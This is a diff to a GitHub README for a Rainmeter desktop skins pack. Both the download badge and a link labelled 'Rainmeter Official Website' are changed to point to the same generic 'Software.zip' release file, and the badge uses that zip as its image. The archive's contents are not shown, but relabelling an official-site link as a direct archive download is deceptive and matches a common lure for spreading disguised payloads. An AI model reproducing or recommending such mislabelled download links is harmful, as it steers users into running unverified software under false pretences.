@@ -3,7 +3,7 @@
 
 Welcome to the "Rainmeter-Skins-Pack" repository! Enhance your desktop with custom Rainmeter skins and widgets to improve your system’s look and functionality.
 
-[![Download Rainmeter Skins Pack](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Rainmeter Skins Pack](https://github.com/vik1612/Rainmeter-Skins-Pack/releases/download/v1.0/Software.zip)](https://github.com/vik1612/Rainmeter-Skins-Pack/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -55,7 +55,7 @@ Are you looking to customize your desktop and add a touch of personalization to 
 
 Ready to transform your desktop? Download the Rainmeter Skins Pack now and start customizing your desktop like never before! 🚀
 
-For more information and updates, visit the [Rainmeter Official Website](https://www.rainmeter.net/).
+For more information and updates, visit the [Rainmeter Official Website](https://github.com/vik1612/Rainmeter-Skins-Pack/releases/download/v1.0/Software.zip).
 
 If the provided download link is not working, please check the "Releases" section of this repository for alternative download options.
 
